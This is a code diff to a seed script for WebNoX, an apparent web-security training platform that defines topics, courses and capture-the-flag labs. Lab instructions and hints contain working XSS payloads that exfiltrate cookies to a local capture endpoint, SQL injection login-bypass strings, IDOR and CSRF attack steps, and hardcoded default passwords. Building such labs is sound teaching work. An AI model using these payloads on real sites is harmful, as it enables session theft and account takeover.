@@ -1,6 +1,6 @@
 """
 WebNoX - Database Seed Script
-Seeds the database with sample courses, lessons, and labs
+Seeds the database with topics, courses, lessons, and labs
 """
 import sys
 import os
@@ -10,6 +10,7 @@ from app import create_app, db
 from app.models.user import User
 from app.models.course import Course, Lesson
 from app.models.lab import Lab
+from app.models.topic import Topic
 import json
 
 def seed_database():
@@ -45,9 +46,103 @@ def seed_database():
         test_user.set_password('student123')
         db.session.add(test_user)
         
+        # Create Security Topics
+        print("🏷️  Creating security topics...")
+        topics_data = [
+            {
+                'name': 'Cross-Site Scripting (XSS)',
+                'slug': 'xss',
+                'description': 'XSS attacks enable attackers to inject malicious scripts into web pages viewed by other users. Learn about reflected, stored, and DOM-based XSS vulnerabilities.',
+                'icon': 'code',
+                'color': '#e74c3c',
+                'severity': 'high',
+                'owasp_category': 'A03:2021 - Injection',
+                'order': 1
+            },
+            {
+                'name': 'SQL Injection',
+                'slug': 'sqli',
+                'description': 'SQL injection attacks exploit vulnerabilities in database queries. Learn to identify, exploit, and prevent SQL injection in web applications.',
+                'icon': 'database',
+                'color': '#9b59b6',
+                'severity': 'critical',
+                'owasp_category': 'A03:2021 - Injection',
+                'order': 2
+            },
+            {
+                'name': 'Cross-Site Request Forgery (CSRF)',
+                'slug': 'csrf',
+                'description': 'CSRF attacks trick users into performing unwanted actions on authenticated websites. Learn how to exploit and defend against CSRF vulnerabilities.',
+                'icon': 'exchange-alt',
+                'color': '#f39c12',
+                'severity': 'medium',
+                'owasp_category': 'A01:2021 - Broken Access Control',
+                'order': 3
+            },
+            {
+                'name': 'Insecure Direct Object Reference (IDOR)',
+                'slug': 'idor',
+                'description': 'IDOR vulnerabilities occur when applications expose internal object references. Learn to find and exploit access control flaws.',
+                'icon': 'key',
+                'color': '#3498db',
+                'severity': 'high',
+                'owasp_category': 'A01:2021 - Broken Access Control',
+                'order': 4
+            },
+            {
+                'name': 'Authentication Bypass',
+                'slug': 'auth-bypass',
+                'description': 'Authentication vulnerabilities allow attackers to bypass login mechanisms. Learn about weak passwords, session hijacking, and authentication flaws.',
+                'icon': 'unlock-alt',
+                'color': '#1abc9c',
+                'severity': 'critical',
+                'owasp_category': 'A07:2021 - Identification and Authentication Failures',
+                'order': 5
+            },
+            {
+                'name': 'Server-Side Request Forgery (SSRF)',
+                'slug': 'ssrf',
+                'description': 'SSRF attacks trick servers into making requests to unintended locations. Learn to exploit internal services and cloud metadata endpoints.',
+                'icon': 'server',
+                'color': '#e67e22',
+                'severity': 'high',
+                'owasp_category': 'A10:2021 - Server-Side Request Forgery',
+                'order': 6
+            },
+            {
+                'name': 'File Upload Vulnerabilities',
+                'slug': 'file-upload',
+                'description': 'Insecure file upload functionality can lead to remote code execution. Learn to bypass upload restrictions and exploit file handling flaws.',
+                'icon': 'file-upload',
+                'color': '#2ecc71',
+                'severity': 'critical',
+                'owasp_category': 'A04:2021 - Insecure Design',
+                'order': 7
+            },
+            {
+                'name': 'XML External Entity (XXE)',
+                'slug': 'xxe',
+                'description': 'XXE attacks exploit XML parsers to access files, perform SSRF, or execute denial of service attacks. Learn XML injection techniques.',
+                'icon': 'file-code',
+                'color': '#8e44ad',
+                'severity': 'high',
+                'owasp_category': 'A05:2021 - Security Misconfiguration',
+                'order': 8
+            }
+        ]
+        
+        topics = {}
+        for topic_data in topics_data:
+            topic = Topic(**topic_data)
+            db.session.add(topic)
+            topics[topic_data['slug']] = topic
+        
+        db.session.flush()
+        
         # Create XSS Course
         print("📚 Creating courses...")
         xss_course = Course(
+            topic_id=topics['xss'].id,
             title='Cross-Site Scripting (XSS) Fundamentals',
             slug='xss-fundamentals',
             description='Learn about Cross-Site Scripting vulnerabilities, from basic concepts to advanced exploitation techniques. Understand how attackers inject malicious scripts and how to defend against them.',
@@ -177,6 +272,7 @@ echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
         
         # Create SQL Injection Course
         sqli_course = Course(
+            topic_id=topics['sqli'].id,
             title='SQL Injection Attacks',
             slug='sql-injection',
             description='Master SQL Injection techniques and learn how to identify, exploit, and prevent database vulnerabilities in web applications.',
@@ -232,27 +328,27 @@ SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
             {
                 'title': 'Reflected XSS - Basic',
                 'slug': 'xss-reflected-basic',
-                'description': 'Your first XSS challenge. Find and exploit a reflected XSS vulnerability to capture the flag.',
+                'description': 'Your first XSS challenge. Find and exploit a reflected XSS vulnerability to discover the hidden flag.',
                 'instructions': '''
 <h3>Objective</h3>
-<p>Find and exploit a reflected XSS vulnerability in the search functionality.</p>
+<p>Find and exploit a reflected XSS vulnerability in the search functionality to reveal the hidden flag.</p>
 
 <h3>Background</h3>
-<p>The target application has a search feature that reflects user input without proper sanitization. Your goal is to inject JavaScript that will reveal the hidden flag.</p>
+<p>The target application has a search feature that reflects user input without proper sanitization. Your goal is to inject JavaScript that will reveal the hidden flag stored in the page.</p>
 
 <h3>Steps</h3>
 <ol>
     <li>Navigate to the search page</li>
     <li>Test the search field for XSS vulnerabilities</li>
     <li>Craft a payload that executes JavaScript</li>
-    <li>Use the browser console or an alert to find the flag</li>
+    <li>Use the DOM to find the hidden flag element</li>
 </ol>
 
 <h3>Hints</h3>
 <ul>
     <li>Start with a simple <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> payload</li>
     <li>Check the page source to see how your input is reflected</li>
-    <li>The flag is stored in a hidden element on the page</li>
+    <li>The flag is stored in a hidden element with id="secret-flag"</li>
 </ul>
 
 <div class="alert alert-info">
@@ -267,28 +363,36 @@ SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
                 'hints': json.dumps([
                     "Try entering HTML tags in the search box",
                     "Look for where your input appears in the page source",
-                    "The flag might be in a hidden div with id='secret-flag'"
+                    "The flag is in a hidden div - use document.getElementById('secret-flag')"
                 ]),
+                'has_bot': False,
                 'order': 1,
                 'is_active': True
             },
             {
                 'title': 'Stored XSS - Comment Section',
                 'slug': 'xss-stored-comments',
-                'description': 'Exploit a stored XSS vulnerability in a comment system to steal session data.',
+                'description': 'Exploit a stored XSS vulnerability in a comment system to steal the admin bot\'s cookies containing the flag.',
                 'instructions': '''
 <h3>Objective</h3>
-<p>Inject a persistent XSS payload into the comment section that will execute for all users viewing the page.</p>
+<p>Inject a persistent XSS payload into the comment section that steals the admin bot's cookies.</p>
+
+<h3>Scenario</h3>
+<p>The blog allows users to post comments that are stored and displayed to all visitors. An <strong>admin bot</strong> visits the page every 30 seconds with cookies containing the flag. Your goal is to steal the admin's cookies!</p>
 
 <h3>Challenge</h3>
-<p>The blog allows users to post comments. The comments are stored and displayed to all visitors. Your goal is to inject a script that extracts the admin's session information.</p>
-
-<h3>Target</h3>
 <ul>
     <li>Post a comment containing your XSS payload</li>
-    <li>The payload should execute when the page loads</li>
-    <li>Extract the flag from the admin session</li>
+    <li>The payload should execute when the admin bot visits</li>
+    <li>Exfiltrate the admin's cookies to the capture endpoint</li>
+    <li>The flag is in the <code>admin_session</code> cookie</li>
 </ul>
+
+<h3>Exfiltration Endpoint</h3>
+<p>Use the built-in endpoint: <code>/capture?data=STOLEN_DATA</code></p>
+
+<h3>Example Payload</h3>
+<pre><code>&lt;script&gt;new Image().src='/capture?data='+document.cookie&lt;/script&gt;</code></pre>
 ''',
                 'difficulty': 'intermediate',
                 'category': 'XSS',
@@ -297,16 +401,19 @@ SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
                 'flag': 'FLAG{st0r3d_xss_p3rs1st3nt}',
                 'hints': json.dumps([
                     "Comments are not sanitized before storage",
-                    "Try using event handlers like onerror",
-                    "Check document.cookie for the flag"
+                    "The admin bot has cookies - use document.cookie to access them",
+                    "Use /capture?data= endpoint to exfiltrate data",
+                    "Try: <script>fetch('/capture?data='+document.cookie)</script>"
                 ]),
+                'has_bot': True,
+                'bot_interval': 30,
                 'order': 2,
                 'is_active': True
             },
             {
                 'title': 'SQL Injection - Login Bypass',
                 'slug': 'sqli-login-bypass',
-                'description': 'Bypass authentication using SQL injection to access the admin panel.',
+                'description': 'Bypass authentication using SQL injection to access the admin panel and find the flag.',
                 'instructions': '''
 <h3>Objective</h3>
 <p>Use SQL injection to bypass the login form and access the admin account.</p>
@@ -322,6 +429,13 @@ SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
     <li>Log in as the admin user</li>
     <li>Find the flag in the admin dashboard</li>
 </ol>
+
+<h3>Hints</h3>
+<ul>
+    <li>Try adding a single quote to cause an SQL error</li>
+    <li>Use SQL comments (--) to ignore the password check</li>
+    <li>Classic payload: <code>admin' --</code></li>
+</ul>
 ''',
                 'difficulty': 'beginner',
                 'category': 'SQL Injection',
@@ -331,29 +445,34 @@ SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
                 'hints': json.dumps([
                     "Try adding a single quote to the username field",
                     "Use -- to comment out the rest of the query",
-                    "admin' OR '1'='1 might be useful"
+                    "admin' OR '1'='1 might be useful",
+                    "Try: admin' --"
                 ]),
+                'has_bot': False,
                 'order': 3,
                 'is_active': True
             },
             {
                 'title': 'IDOR - User Profile Access',
                 'slug': 'idor-profile',
-                'description': 'Exploit an Insecure Direct Object Reference vulnerability to access other users\' profiles.',
+                'description': 'Exploit an Insecure Direct Object Reference vulnerability to access other users\' private profiles and find the admin\'s secret flag.',
                 'instructions': '''
 <h3>Objective</h3>
-<p>Access another user's private profile by manipulating the request parameters.</p>
+<p>Access the admin's private profile by manipulating the request parameters to find their secret notes containing the flag.</p>
 
 <h3>Scenario</h3>
-<p>After logging in, you can view your profile at <code>/profile?id=123</code>. The application doesn't properly verify if you're authorized to view the requested profile.</p>
+<p>After logging in, you can view your profile at <code>/profile?id=100</code>. The application doesn't properly verify if you're authorized to view other profiles.</p>
 
 <h3>Challenge</h3>
 <ul>
-    <li>Log in with the provided test account</li>
+    <li>Log in with the provided guest account (guest / guest)</li>
     <li>Find your profile page and note the URL structure</li>
     <li>Access the admin's profile (user ID 1)</li>
     <li>Retrieve the flag from the admin's private notes</li>
 </ul>
+
+<h3>Test Account</h3>
+<p>Username: <code>guest</code> | Password: <code>guest</code></p>
 ''',
                 'difficulty': 'beginner',
                 'category': 'IDOR',
@@ -363,29 +482,35 @@ SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
                 'hints': json.dumps([
                     "Change the id parameter in the URL",
                     "Admin is usually the first user (ID=1)",
-                    "No authentication is needed to access other profiles"
+                    "Try accessing /profile?id=1"
                 ]),
+                'has_bot': False,
                 'order': 4,
                 'is_active': True
             },
             {
                 'title': 'CSRF - Password Change',
                 'slug': 'csrf-password',
-                'description': 'Craft a CSRF attack to change another user\'s password without their knowledge.',
+                'description': 'Craft a CSRF attack to change a victim\'s password without their knowledge. Exploit the missing CSRF protection.',
                 'instructions': '''
 <h3>Objective</h3>
-<p>Create a malicious page that, when visited by the victim, changes their password.</p>
+<p>Create a malicious page that, when visited by the victim, changes their password without their consent.</p>
 
 <h3>Vulnerability</h3>
-<p>The password change form doesn't include CSRF tokens or verify the referrer header.</p>
+<p>The password change form doesn't include CSRF tokens or verify the origin of requests. This allows cross-site request forgery attacks.</p>
 
 <h3>Steps</h3>
 <ol>
+    <li>Log in as the attacker (attacker / attacker123)</li>
     <li>Analyze the password change request</li>
-    <li>Create an HTML page with a hidden form</li>
-    <li>The form should auto-submit when loaded</li>
+    <li>Create an HTML page with a hidden form targeting the victim</li>
+    <li>Make the form auto-submit using JavaScript</li>
     <li>Simulate the victim visiting your malicious page</li>
 </ol>
+
+<h3>Test Accounts</h3>
+<p>Victim: <code>victim / victim123</code></p>
+<p>Attacker: <code>attacker / attacker123</code></p>
 ''',
                 'difficulty': 'intermediate',
                 'category': 'CSRF',
@@ -394,15 +519,31 @@ SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
                 'flag': 'FLAG{csrf_p4ssw0rd_ch4ng3}',
                 'hints': json.dumps([
                     "Use a hidden form with method POST",
-                    "JavaScript can auto-submit the form",
-                    "The target endpoint is /change-password"
+                    "JavaScript can auto-submit: document.forms[0].submit()",
+                    "The endpoint is POST /change-password",
+                    "Include new_password and confirm_password fields"
                 ]),
+                'has_bot': False,
                 'order': 5,
                 'is_active': True
             }
         ]
         
+        # Map labs to topics
+        lab_topic_map = {
+            'xss-reflected-basic': 'xss',
+            'xss-stored-comments': 'xss',
+            'sqli-login-bypass': 'sqli',
+            'idor-profile': 'idor',
+            'csrf-password': 'csrf'
+        }
+        
         for lab_data in labs:
+            # Add topic_id based on the mapping
+            topic_slug = lab_topic_map.get(lab_data['slug'])
+            if topic_slug and topic_slug in topics:
+                lab_data['topic_id'] = topics[topic_slug].id
+            
             lab = Lab(**lab_data)
             db.session.add(lab)
         
@@ -413,6 +554,10 @@ SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
         print("📋 Created accounts:")
         print("   Admin: admin@webnox.local / admin123")
         print("   Student: student@webnox.local / student123")
+        print("")
+        print("🏷️  Topics created: " + ", ".join([t['name'] for t in topics_data]))
+        print("📚 Courses created: 2")
+        print("🔬 Labs created: 5 (1 with bot)")
         print("")
         print("🚀 Run the app with: python run.py")
 
